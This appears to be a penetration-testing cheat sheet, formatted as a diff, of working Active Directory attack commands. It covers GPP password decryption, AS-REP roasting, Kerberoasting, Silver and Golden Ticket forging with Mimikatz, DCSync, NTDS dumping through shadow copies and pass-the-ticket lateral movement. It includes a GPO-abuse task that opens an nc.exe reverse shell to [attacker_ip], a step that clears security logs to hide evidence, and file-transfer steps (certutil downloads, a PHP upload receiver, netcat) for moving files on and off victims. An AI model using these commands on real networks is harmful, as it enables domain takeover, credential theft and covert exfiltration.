+Open Active Directory Users and Computers and enable Advanced Features under the View menu. Browse to find service accounts.
+
+- Finding SPNs:
+### PowerShell
+> ```powershell
+> Get-ADComputer -Filter * -Properties ServicePrincipalName | Select-Object -ExpandProperty ServicePrincipalName
+> ```  
+
+### Bash (Kali)
+> ```bash
+> ldapsearch -x -h <DC_IP> -b "DC=domain,DC=com" "(&(objectClass=computer)(servicePrincipalName=*))" servicePrincipalName
+> ```  
+
+- Check users of the domain:
+> ```cmd
+> net user /domain
+> net user [username] /domain
+> ```
+
+- Check groups of the domain:
+> ```cmd
+> net groups /domain
+> net groups [groupName] /domain
+> ```
+
+- Script to get the full LDAP path:
+> ```powershell
+> $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
+> $DN = ([adsi]'').distinguishedName 
+> $LDAP = "LDAP://$PDC/$DN"
+>
+> Script to get full information for SAM account types:
+>
+> function Get-SAMInfo {
+>   $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
+>   $DN = ([adsi]'').distinguishedName 
+>   $LDAP = "LDAP://$PDC/$DN"
+>   $direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
+>   $dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
+>   $dirsearcher.filter = "samAccountType=805306368"
+>   $dirsearcher.FindAll() | ForEach-Object {
+>       $_.Properties
+>   }
+> }
+> ```
+
+- Enumerate nested groups with custom LDAP query:
+> ```powershell
+> $group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=[GroupName]))"
+> ```
+
+- Encapsulate LDAP search into a function:
+> ```powershell
+> function LDAPSearch {
+>   param ([string]$LDAPQuery)
+>   $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
+>   $DistinguishedName = ([adsi]'').distinguishedName
+>   $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
+>   $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
+>   return $DirectorySearcher.FindAll()
+> }
+> ```
+
+- Perform user search using LDAP query:
+> ```powershell
+> LDAPSearch -LDAPQuery "(samAccountType=805306368)"
+> ```
+
+- Search for all possible groups in AD:
+> ```powershell
+> LDAPSearch -LDAPQuery "(objectclass=group)"
+> ```
+
+- Iterate through objects in $group variable:
+> ```powershell
+> foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {
+>   $group.Properties | Select-Object {$_.cn}, {$_.member}
+> }
+> ```
+
+## Object Permissions
+
+Active Directory permission types:
+        GenericAll: Full permissions
+        GenericWrite: Edit certain attributes
+        WriteOwner: Change ownership
+        WriteDACL: Edit ACEs applied
+        AllExtendedRights: Change/reset password, etc.
+        ForceChangePassword: Force password change
+        Self: Add self to groups
+
+- Run Get-ObjectAcl (PowerView) to specify user:
+> ```powershell
+> Get-ObjectAcl -Identity [username]
+> ```
+
+- Convert Object SID to a name:
+> ```powershell
+> Convert-SidToName [SID]
+> ```
+
+- Enumerate ACLs for a group:
+> ```powershell
+> Get-ObjectAcl -Identity "[GroupName]" | Where-Object { $_.ActiveDirectoryRights -eq "GenericAll" } | Select-Object SecurityIdentifier, ActiveDirectoryRights
+> ```
+
+- Convert SIDs with GenericAll permission to names:
+> ```powershell
+> "[SID1]", "[SID2]" | Convert-SidToName
+> ```
+
+- Add yourself to a domain group:
+> ```powershell
+> net group "[GroupName]" [username] /add /domain
+> ```
+
+- Verify group membership:
+> ```powershell
+> Get-NetGroup "[GroupName]" | Select-Object member
+> ```
+
+## GPP Passwords
+
+1. Search for GPP Passwords in SYSVOL: access SYSVOL share and search for Group Policy Preferences (GPP) files; this happens because a common useful misconfiguration found in modern domain environments is unprotected Windows GPP settings files
+
+    Map the DC SYSVOL share:
+
+> ```cmd
+> net use z:\\[hostname/domain]\SYSVOL
+> ```
+
+2. Find the GPP file: usually the one called Groups.xml: the file is usually located in a path similar to this one \hostname.domain\Policies\{00000000-0000-0000-0000-00000000000}\MACHINE\Preferences\Groups\Groups.xml.
+
+> ```cmd
+> dir /s Groups.xml
+> type Groups.xml
+> ```
+
+3. Decrypt the Found Hash / cpassword:
+> ```text
+> gpp-decrypt [gpp_hash/cpassword]
+> ```
+# Example
+> ```bash
+> gpp-decrypt riBZpPtHOGtVk+SdLOmJ6xiNgFH6Gp45BoP3I6AnPgZ1IfxtgI67qqZfgh78kBZB
+> sup3r53cr3tGP0pa55
+> ```
+
+(Optional) Alternative Method:
+
+1. Check for cpassword in the SYSvol share to obtain cleartext passwords in XML files.
+> ```cmd
+> dir \\\\<domain>\\SYSVOL\\<domain>\\Policies\\ /s /b | findstr cpassword
+> ```
+
+2. Look for Groups.xml files which might contain cleartext passwords.
+> ```bash
+> smbclient //dc-ip/SYSVOL -U "domain\username"
+> ```
+
+3. Impacket-Get-GPPPassword
+
+- NULL Session: this command attempts to retrieve GPP passwords without providing any credentials (NULL session). Useful if anonymous access is allowed on the target Domain Controller (DC).
+> ```bash
+> impacket-Get-GPPPassword -no-pass '[DOMAIN_CONTROLLER]'
+> ```
+
+- With Cleartext Credentials: uses cleartext credentials (username and password) to access and retrieve stored GPP passwords from the DC.
+> ```bash
+> impacket-Get-GPPPassword '[DOMAIN]'/'[USER]':'[PASSWORD]'@'[DOMAIN_CONTROLLER]'
+> ```
+
+- Pass-the-Hash (with NT hash): executes a pass-the-hash attack with the user’s NTLM hash instead of a password, allowing retrieval of GPP passwords.
+> ```bash
+> impacket-Get-GPPPassword -hashes :'[NThash]' '[DOMAIN]'/'[USER]':'[PASSWORD]'@'[DOMAIN_CONTROLLER]'
+> ```
+
+- Parsing a Local File: this command parses a local Policy XML file for stored passwords. Useful if you have a downloaded or extracted policy file on your machine.
+> ```bash
+> impacket-Get-GPPPassword -xmlfile '/path/to/Policy.xml' 'LOCAL'
+> ```
+
+## GPO Abuse
+
+1. Import [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
+> ```powershell
+>  powershell -ExecutionPolicy bypass
+> Import-Module ./PowerView.ps1
+> ```
+
+2. List All GPOs: use PowerView to list all GPOs and check if there are write permissions for any.
+        Basic GPO Listing
+> ```powershell
+> Get-NetGPO | select displayname
+> ```
+
+2. Manual Permission Check: this checks if you have any write permissions on GPOs, which could allow for privilege escalation.
+> ```powershell
+> Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')} | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
+> ```
+
+2. BloodHound Alternative: use BloodHound to check for WriteGPO, OwnsGPO, or GPO control privileges, as they indicate possible GPO manipulation for escalation.
+
+3. Enumerate a Specific GPO
+        Identify GPO by Display Name
+> ```powershell
+> Get-GPO -Name "[DisplayName]"
+> ```
+
+4. Convert GPO ID to Name
+> ```powershell
+> Get-GPO -Guid [gpo_id]
+> ```
+
+5. Check Permissions on Specific GPO: verify if you have edit permissions or ownership on a particular GPO.
+> ```powershell
+> Get-GPPermission -Guid [gpo_id] -TargetType User -TargetName [user]
+> ```
+
+6. Execute the Attack (If Permissions Allow): se SharpGPOAbuse to manipulate GPOs.
+        Create a Reverse Shell Task
+> ```cmd
+> ./SharpGPOAbuse.exe --AddComputerTask --TaskName "test" --Author "[current_user]" --Command "cmd.exe" --Arguments "/c c:\path\to\nc.exe [attacker_ip] [port] -e cmd.exe" --GPOName "[GPO_to_abuse]"
+> ```
+
+7. Add User to Administrators Group
+> ```cmd
+> .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName "[GPO_to_abuse]"
+> ```
+
+8. Force Policy Update: apply the GPO changes immediately across the domain.
+> ```cmd
+> gpupdate /force
+> ```
+
+## AS-REP Roasting
+
+1. Find users without pre-authentication:
+> ```powershell
+> Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Property DoesNotRequirePreAuth
+> ```
+
+2. AS-REP Roasting using Rubeus:
+> ```cmd
+> Rubeus.exe asreproast
+> ```
+### The /nowrap option prevents the output from being wrapped to the next line, allowing you to see the entire output on a single line without any breaks
+> ```cmd
+> Rubeus.exe asreproast /nowrap
+> ```
+
+3. AS-REP Hash extraction using Impacket:
+### From Kali (GetNPUsers.py)
+> ```bash
+> impacket-GetNPUsers -dc-ip [dc-ip] -request -outputfile [output_file].asreproast [domain.com]/[user]
+> ```
+### From Windows
+> ```bash
+> impacket-GetNPUsers domain/[user]:[password]@[dc-ip] -no-pass
+> ```
+
+4. Crack the AS-REP hash:
+> ```bash
+> hashcat -m 18200 [asrep_hashes_file].txt /usr/share/wordlists/rockyou.txt
+> ```
+
+## Kerberoasting
+
+How it works:
+    The attacker requests a TGS for a service account (SPN) that has a valid ticket.
+    The service's TGS is encrypted with the service account's password hash.
+    The attacker can extract the TGS ticket and crack it offline using tools like hashcat.
+
+
+1. Enumerate Service Principal Names (SPNs):
+> ```bash
+> impacket-GetUserSPNs domain/[user]:[password]@[dc-ip]
+> ```
+    
+2. Request a TGS ticket for SPNs:
+### From Kali
+> ```bash
+> sudo impacket-GetUserSPNs -request -dc-ip [dc-ip] [domain.com]/[user]
+> ```
+or
+> ```bash
+> sudo impacket-GetUserSPNs -request -dc-ip [dc_ip] [domain.com]/[user] -hashes [LMHASH]:[NTHASH] -outputfile [output_file]
+> ```
+### From Windows
+> ```text
+> GetUserSPNs.py domain/[user]:[password]@[dc-ip] -request
+> ```
+    
+3. Extract TGS ticket from memory using Rubeus:
+> ```cmd
+> Rubeus.exe kerberoast
+> ```
+or
+> ```cmd
+> Rubeus.exe kerberoast /outfile:[output_file].kerberoast
+> ```
+    
+- Crack the TGS hash:
+> ```bash
+> hashcat -m 13100 [kerberoast_hashes_file].txt /usr/share/wordlists/rockyou.txt
+> ```
+
+## Silver Ticket
+
+How it works:
+
+    The attacker obtains the NTLM hash or Kerberos hash of a service account.
+    The attacker uses this hash to create a forged TGS ticket, allowing them to authenticate to specific services (e.g., CIFS, HTTP).
+    Since Silver Tickets bypass domain controllers, they are harder to detect in logs.
+
+Steps:
+    Extract NTLM hash of the service account (e.g., CIFS):
+
+1. Find the [ServiceAccountName]
+> ```powershell
+> Get-ADUser -Filter {ServicePrincipalName -ne $null} -Property ServicePrincipalName | Select-Object Name, ServicePrincipalName
+> ```
+or
+> ```powershell
+> Get-ADUser -Filter {ServicePrincipalName -like "*MSSQL*"} -Property ServicePrincipalName | Select-Object Name, ServicePrincipalName
+>
+
+2. Extract the NTLM hash
+> ```text
+> mimikatz # lsadump::lsa /inject /name:[ServiceAccountName]
+> ```
+# Example:
+> ```text
+> mimikatz # lsadump::dcsync /user:HTTP/server01
+> ```
+    
+  Create a Silver Ticket using Mimikatz:
+1. Find the Domain SID
+> ```powershell
+> (Get-ADDomain).DomainSID
+> ```
+or
+> ```powershell
+> whoami /user
+> ```
+
+2. Find the target server (my DC server)
+> ```powershell
+> Get-ADDomainController -Filter *
+> ```
+or
+> ```cmd
+> netdom query dc
+> ```
+
+3. Create the Silver Ticket, for example in this case /service:CIFS (for help deciding the /service, check Section 12.11)
+> ```text
+> mimikatz # kerberos::golden /domain:[domain.com] /sid:[domainSID] /target:[targetserver] /rc4:[NTLMHash] /service:[serviceName] /user:[username]
+> ```
+### Example:
+> ```text
+> mimikatz # kerberos::golden /sid:S-1-5-21-1863423273-656352785-1243762498 /domain:example.com /ptt /target:server01.example.com /service:http /rc4:4d28cf5252d39971462580a51484ca09 /user:testUser
+> ```
+
+4. Inject the Silver Ticket into the session:
+> ```text
+> mimikatz # kerberos::ptt silver_ticket.kirbi
+> ```
+
+5. Confirm the existence of the ticket
+> ```cmd
+> klist
+> ```
+
+6. Access the target service (e.g., CIFS):
+> ```cmd
+> dir \\targetserver\sharedfolder
+> ```
+
+## Golden Ticket
+
+How it works:
+
+    The attacker dumps the KRBTGT account hash (using tools like Mimikatz).
+    Using this hash, they can create a forged TGT for any user.
+    The forged TGT can be used to authenticate as any user across the domain, including Domain Admins.
+
+Steps:
+1. Dump KRBTGT account hash:
+> ```text
+> mimikatz # lsadump::dcsync /domain:[domain.com] /user:krbtgt
+> ```
+
+2. Create Golden Ticket using Mimikatz:
+### 1. Find the Domain SID
+> ```powershell
+> (Get-ADDomain).DomainSID
+> ```
+or
+> ```cmd
+> whoami /user
+> ```
+
+### 2. Find the RID: The RID for the Administrator account is 500, but other accounts will have different RIDs. You can find the RID of a specific user using tools like Mimikatz or by querying Active Directory.
+> ```powershell
+> PowerShell -Command "(New-Object System.Security.Principal.NTAccount('domain\ServiceAccount')).Translate([System.Security.Principal.SecurityIdentifier]).Value"
+> ```
+
+### 3. Create the Ticket
+> ```text
+> mimikatz # kerberos::golden /user:[DesiredUsername] /domain:[domain.com] /sid:[domainSID] /krbtgt:[KRBTGTHash] /id:[DesiredRID]
+> ```
+or
+> ```text
+> mimikatz # kerberos::golden /user:Administrator /domain:[domain.com] /sid:[domainSID] /krbtgt:[KRBTGTHash] /id:500
+> ```
+
+3. Inject Golden Ticket:
+> ```text
+> mimikatz # kerberos::ptt golden_ticket.kirbi
+> ```
+
+4. Confirm the existence of the ticket
+> ```cmd
+> klist
+> ```
+
+5. Access domain resources:
+> ```cmd
+> net use \\domaincontroller\C$ /user:[DesiredUsername]
+> ```
+
+## DCSYNC
+
+How it works:
+
+    Permissions: The attacker needs to have the Replicating Directory Changes or Replicating Directory Changes All permissions, which are often granted to Domain Admins and other high-privilege accounts.
+    Replication Request: By sending a replication request, the attacker can pull user account data, including password hashes, directly from a Domain Controller.
+    Credential Theft: Once the attacker obtains these hashes, they can use them for further attacks (like Pass-the-Hash or Pass-the-Ticket) or crack them to obtain plaintext passwords.
+
+Steps:
+1. Identify Domain Admins: ensure you have the required permissions.
+> ```powershell
+> Get-ADGroupMember -Identity "Domain Admins"
+> ```
+
+2. Perform DC Sync using Mimikatz:
+### From Kali
+> ```bash
+> impacket-secretsdump [domain.com]/[adminUser]:"[password]"@[dc-ip]
+> ```
+### or; the -just-dc-user [targetUser] is to only extract the hashes of the indicated user and not all the DC.
+> ```bash
+> impacket-secretsdump -just-dc-user [targetUser] [domain.com]/[adminUser]:"[password]"@[dc-ip]
+> ```
+### From Windows
+> ```text
+> mimikatz # lsadump::dcsync /domain:[domain.com]
+> ```
+### or; here we just extract the specified user.
+> ```text
+> mimikatz # lsadump::dcsync /domain:[domain.com] /user:[targetUser]
+> ```
+
+3. Extracting all accounts and hashes:
+> ```text
+> mimikatz # lsadump::dcsync /domain:[domain.com]
+> ```
+
+4. Output to a file:
+### You can redirect output to a file for analysis:
+> ```text
+> mimikatz # lsadump::dcsync /domain:domain.com > output.txt
+> ```
+
+5. Crack dumped hashes:
+> ```bash
+> hashcat -m 1000 [hashes_file].txt /usr/share/wordlists/rockyou.txt
+> ```
+
+## Shadow Copies
+
+How It Works:
+
+    Creation of Shadow Copies: Shadow Copies are created automatically or can be manually initiated. They allow for data recovery and backup without disrupting active processes.
+    Accessing Shadow Copies: The shadow copies can be accessed through the file system, often found in a hidden directory. This feature can be used to recover deleted files or view past versions of files.
+
+Steps to Attack Shadow Copies:
+
+1. Create a Shadow Copy of the Entire Disk: this action requires local administrator privileges.
+### -p X: this indicates which disk we wanto to copy, usually is C.
+> ```cmd
+> vshadow.exe -nw -p C:
+> ```
+    
+2. Copy the NTDS Database to the Specified Destination Copying the NTDS Database to the C: Drive: to back up the NTDS database from the shadow copy, use the following command.
+
+### Replace X with the shadow copy number, found in the previous command
+> ```cmd
+> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\ntds\ntds.dit C:\desired\backup\path\ntds.dit.bak
+> ```
+### Example
+> ```cmd
+> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
+> ```
+
+3. Save the System Registry to the Specified Destination:
+
+> ```cmd
+> reg.exe save hklm\system C:\backup_path\system.bak
+> ```
+### Example
+> ```cmd
+> C:\> reg.exe save hklm\system c:\system.bak
+> ```
+
+4. Download the Files to the Kali.
+
+5. Extract the Data from the NTDS Database using Kali: this command retrieves user credentials and hash values from the NTDS database backup, enabling further security assessments.
+
+> ```cmd
+> impacket-secretsdump -ntds [ntds_file] -system [system_file] LOCAL
+> ```
+### Example
+> ```cmd
+> impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
+> ```
+### (Optional): use Mimikatz to extract the credentials if it is not possible to bring the files to the Kali.
+> ```text
+> mimikatz # lsadump::ntds /ntds:"[ntds_file]" /system:"[system_file]"
+> ```
+
+Steps to Access Shadow Copies:
+
+1. List Shadow Copies: use the following command to view existing shadow copies on a system.
+
+> ```cmd
+> vssadmin list shadows
+> ```
+
+2. Access a Shadow Copy:
+   Find the shadow copy you want to access and note its shadow copy ID.
+        Mount the shadow copy using the following command:
+
+### Replace X with the shadow copy number.
+> ```cmd
+> mklink /d C:\ShadowCopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX
+> ```
+
+3. Explore the Mounted Shadow Copy: navigate to the new folder (C:\ShadowCopy) to explore and extract files.
+
+> ```cmd
+> dir C:\ShadowCopy
+> ```
+
+4. Recover Sensitive Data: look for sensitive files, such as password files, documents, or configuration files that may contain credentials or sensitive information.
+
+## Pass-the-ticket
+
+How It Works:
+    Kerberos Authentication Flow: When a user authenticates, a TGT is issued by the Key Distribution Center (KDC) and stored in memory.
+    Ticket Extraction: If an attacker has SYSTEM access to a machine, they can extract the TGT of any user currently logged in using tools like Mimikatz.
+    Ticket Injection: The attacker can inject the stolen TGT into their own session to impersonate that user without needing their credentials.
+    Lateral Movement: With the TGT in memory, the attacker can access other systems and services as the compromised user, including Domain Controllers.
+
+Steps to Perform a Pass-the-Ticket Attack:
+    Gain SYSTEM Access on a Compromised Machine:
+    You need SYSTEM privileges to extract tickets from memory using Mimikatz or similar tools.
+
+1. Extract Kerberos Tickets Using Mimikatz:
+> ```text
+> mimikatz
+> privilege::debug
+> sekurlsa::tickets
+> ```
+2. Export the TGT to a File:
+### This will save .kirbi files to disk. Identify the correct TGT based on the user and encryption type.
+> ```text
+> sekurlsa::tickets /export
+> ```
+3. Inject the TGT into Your Session:
+> ```text
+> kerberos::ptt C:\path\to\admin_ticket.kirbi
+> ```
+4. Verify the Injected Ticket:
+> ```text
+> klist
+> ```
+5. Perform Lateral Movement with the Injected Identity Perform Lateral Movement with the Injected Identity (in this case is getting RCE to another system but it can be accessing any other privileged resource):
+### From Windows
+### Using VMI
+> ```cmd
+> wmic /node:[target_host] process call create "cmd.exe"
+> ```
+### Using PsExec - SysInternal (May still require plaintext creds unless SMB session picks up Kerberos ticket)
+> ```cmd
+> PsExec.exe \\[target_host] -u [domain]\[username] cmd.exe
+> ```
+### Using WinRM (PowerShell Remoting)
+> ```powershell
+> Enter-PSSession -ComputerName [target_host] -Authentication Kerberos -Credential [domain]\[username]
+> ```
+### RDP: use mstsc (Remote Desktop), if TGT is injected correctly and domain trust allows it, you won’t be prompted for a password.
+### From Kali
+### Transfer the .kirbi to your Kali machine, and then convert the .kirbi ticket
+> ```bash
+> kirbi2ccache [ticket_file].kirbi > [ticket_file].ccache
+> export KRB5CCNAME=./[ticket_file].ccache
+> ```
+### Using PsExec
+> ```bash
+> impacket-psexec -k -no-pass [domain]/[username]@[target_host]
+> ```
+### Using Evil-WinRM
+> ```bash
+> evil-winrm -k -no-pass -u [username] -d [domain] -i [target_host]
+> ```
+
+---
+
+## Useful Privileges
+
+| Privilege                        | Impact      | Tool            | Execution Path                                                                                                                                                                                                                   | Remarks                                                                                             |
+|-----------------------------------|-------------|-----------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------|
+| SeAssignPrimaryToken              | Admin       | 3rd party tool  | "It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"                                                                                         |                                                           |
+| SeAudit                           | Threat      | 3rd party tool  | Write events to the Security event log to fool auditing or to overwrite old events.                                                                                                                                                  | Writing own events is possible with Authz Report Security Event API.                               |
+| SeBackup                          | Admin       | 3rd party tool  | 1. Backup the HKLM\SAM and HKLM\SYSTEM registry hives<br>2. Extract the local accounts hashes from the SAM database<br>3. Pass-the-Hash as a member of the local Administrators group                                               | For more information, refer to the SeBackupPrivilege file.                                          |
+| SeBackup                          | Admin       | Built-in commands| 1. Enable the privilege in the token<br>2. Export the HKLM\SAM and HKLM\SYSTEM registry hives<br>3. Transfer the exported hives on a controlled computer<br>4. Extract the local accounts hashes from the export SAM hive.         | Pass-the-Hash authentications can be attempted over various services such as SMB, WinRM, and more.  |
+| SeCreateToken                     | Admin       | 3rd party tool  | Create arbitrary token including local admin rights with NtCreateToken.                                                                                                                                                           |                                                                                                     |
+| SeDebug                           | Admin       | PowerShell      | Duplicate the lsass.exe token.                                                                                                                                                                                                      | Script to be found at FuzzySecurity.                                                               |
+| SeImpersonate                     | Admin       | 3rd party tool  | Tools from the Potato family (potato.exe, RottenPotato, RottenPotatoNG, Juicy Potato, SigmaPotato, SweetPotato, RemotePotato0), RogueWinRM, PrintSpoofer.                                                                             | Allows to create a process under the security context of another user.                             |
+| SeIncreaseQuota                   | Availability| 3rd party tool  | Change cpu, memory, and cache limits to some values making the OS unbootable.                                                                                                                                                       | The same privilege is used for managing registry quotas.                                           |
+| SeLoadDriver                      | Admin       | 3rd party tool  | 1. Load buggy kernel driver such as szkg64.sys<br>2. Exploit the driver vulnerability                                                                                                                                              | CVE-2018-15732 is associated with szkg64.                                                          |
+| SeRestore                         | Admin       | PowerShell      | 1. Launch PowerShell/ISE with the SeRestore privilege present.<br>2. Enable the privilege with Enable-SeRestorePrivilege.<br>3. Rename utilman.exe to utilman.old<br>4. Rename cmd.exe to utilman.exe                            | Attack may be detected by some AV software. Alternative method uses replacing service binaries.     |
+| SeSecurity                        | Threat      | Built-in commands| Clear Security event log: wevtutil cl Security<br>Shrink the Security log to 20MB: wevtutil sl Security /ms:0<br>Read Security event log to gain knowledge about processes, access, and actions of other users.                    | Purging old events without leaving obvious evidence of cleaning.                                    |
+| SeShutdown                        | Availability| Built-in commands| shutdown.exe /s /f /t 1                                                                                                                                                                                                              | Allows to call NtRaiseHardError causing immediate BSOD and memory dump, leading potentially to sensitive information disclosure. |
+| SeTakeOwnership                   | Admin       | Built-in commands| 1. takeown.exe /f "%windir%\system32"<br>2. icacls.exe "%windir%\system32" /grant "%username%":F<br>3. Rename cmd.exe to utilman.exe                                                                                             | Attack may be detected by some AV software. Alternative method uses replacing service binaries.     |
+| SeTcb                              | Admin       | 3rd party tool  | Manipulate tokens to have local admin rights included.                                                                                                                                                                           | Sample code+exe creating arbitrary tokens to be found at PsBits.                                    |
+| SeTrustedCredManAccess            | Threat      | 3rd party tool  | Dumping credentials from Credential Manager                                                                                                                                                                                          |                                                                                                     |
+
+---
+
+## File Transferring
+
+1. SMB
+   - On the attacker Kali machine:
+> ```bash
+> impacket-smbserver [name_we_give_to_this_share] . -smb2support  -username my_user -password my_password
+> ```
+    
+   - On the victim Windows machine:
+> ```cmd
+> net use m: \\[my_kali_IP]\[name_we_gave_to_the_share] /user:my_user my_password
+> ```
+
+2. HTTP Requests
+   - Set HTTP Server in our Kali
+> ```bash
+> python3 -m http.server 80
+> ```
+> ```text
+> (new-object System.Net.WebClient).DownloadFile('http://192.168.119.138:800/chisel.exe','C:\Windows\Tasks\chisel.exe')
+> ```
+   - Download in Windows (different options)
+### From PowerShell
+> ```powershell
+> (New-Object System.Net.WebClient).DownloadFile('http://[kali_IP]/[file_to_download]', '[output_file_name_or_path]')
+> ```
+> ```powershell
+> Invoke-WebRequest -Uri http://[kali_IP]/[file_to_download] -OutFile [output_file_name]
+> ```
+### If iwr does not work 
+> ```cmd
+> certutil -urlcache -split -f http://[kali_IP]/[file_to_download]
+> ```
+### From CMD
+> ```cmd
+> powershell -Command "(New-Object Net.WebClient).DownloadFile('http://[kali_IP]/[file_to_download]', '[output_file_name_or_path]')"
+> ```
+
+3. PHP Script (bring files from Windows)
+    - Create the file upload.php in Kali
+> ```php
+> <?php
+>   $uploaddir = '/var/www/uploads/';
+>
+>   $uploadfile = $uploaddir . $_FILES['file']['name'];
+>
+>   move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
+> ?>
+> ```
+   - Move the file to specific folder var/www/uploads
+
+> ```bash
+> chmod +x upload.php
+>
+> sudo mkdir /var/www/uploads
+>
+> mv upload.php /var/www/uploads
+> ```
+    
+   - Start the Apache server
+
+> ```bash
+> service apache2 start
+>
+> ps -ef | grep apache
+> ``` 
+   
+   - Send the files from the Windows
+> ```powershell
+> powershell (New-Object System.Net.WebClient).UploadFile('http://<your Kali ip>/upload.php', '<file you want to transfer>')
+> ```
+   - Stop the Apache server
+> ```bash
+> service apache2 stop
+> ```
+
+4. Netcat
+    - On the receiver machine: Start listening on a specific port and redirect the incoming file to a local file.
+> ```bash
+> nc -lvp 4444 > received_file.txt
+> ```
+### (Optional) If we need to transfer the files over an encrypted connection just attach the --ssl option
+> ```bash
+> ncat --ssl -lvp 4444 > received_file.txt
+> ```
+
+   - On the sender machine: Send the file to the receiver’s IP address on the same port.
+> ```bash
+> nc <receiver_IP> 4444 < file_to_send.txt
+> ```
+### (Optional) If we need to receive the files over an encrypted connection just attach the --ssl option
+> ```bash
+> ncat --ssl <receiver_IP> 4444 < file_to_send.txt
+> ```
+
+5. Send a File with Compression
+   - Compressing the file before sending can speed up the transfer:
+    - On the receiver machine:
+> ```bash
+> nc -lvp 4444 | tar xzvf -
+> ```
+    
+   - On the sender machine:
+> ```bash
+> tar czvf - file_or_folder_to_send | nc <receiver_IP> 4444
+> ```
+
+6. Using Base64 Contents
+Transferring Base64 via Copy and Paste
+
+Sometimes, you may need to transfer a file by copying and pasting its Base64-encoded contents directly in a terminal session. This method can be useful when you can't transfer files directly, but can transfer text.
+
+   - Encode the file and print its Base64-encoded contents in the terminal:
+### This will print the Base64 string directly in the terminal, which you can copy manually
+> ```bash
+> base64 file_to_send.txt
+> ```
+   - On the receiver machine:
+### You can manually paste the Base64-encoded content into a new file
+> ```bash
+> echo "PASTE_BASE64_CONTENTS_HERE" | base64 -d > received_file.txt
+> ```
+
+7. Transferring Base64 Contents via Netcat
+    - On the receiver machine:
+> ```bash
+> nc -lvp 4444 | base64 -d > received_file.txt
+   - On the sender machine:
+> ```bash
+> base64 file_to_send.txt | nc <receiver_IP> 4444
+> ```
+
+8. Certutil
+> ```cmd
+> certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
+> ```
+
+9. Basic wget
+> ```
+> function __wget() {
+>     : ${DEBUG:=0}
+>     local URL=$1
+>     local tag="Connection: close"
+>     local mark=0
+>
+>     if [ -z "${URL}" ]; then
+>         printf "Usage: %s \"URL\" [e.g.: %s http://www.google.com/]" \
+>                "${FUNCNAME[0]}" "${FUNCNAME[0]}"
+>         return 1;
+>     fi
+>     read proto server path <<<$(echo ${URL//// })
+>     DOC=/${path// //}
+>     HOST=${server//:*}
+>     PORT=${server//*:}
+>     [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
+>     [[ $DEBUG -eq 1 ]] && echo "HOST=$HOST"
+>     [[ $DEBUG -eq 1 ]] && echo "PORT=$PORT"
+>     [[ $DEBUG -eq 1 ]] && echo "DOC =$DOC"
+>
+>     exec 3<>/dev/tcp/${HOST}/$PORT
+>     echo -en "GET ${DOC} HTTP/1.1\r\nHost: ${HOST}\r\n${tag}\r\n\r\n" >&3
+>     while read line; do
+>         [[ $mark -eq 1 ]] && echo $line
+>         if [[ "${line}" =~ "${tag}" ]]; then
+>             mark=1
+>         fi
+>     done <&3
+>     exec 3>&-
+> }
+> ```
+- Usage:
+> ```bash
+> __wget http://<LHOST>/<FILE>
+> ```
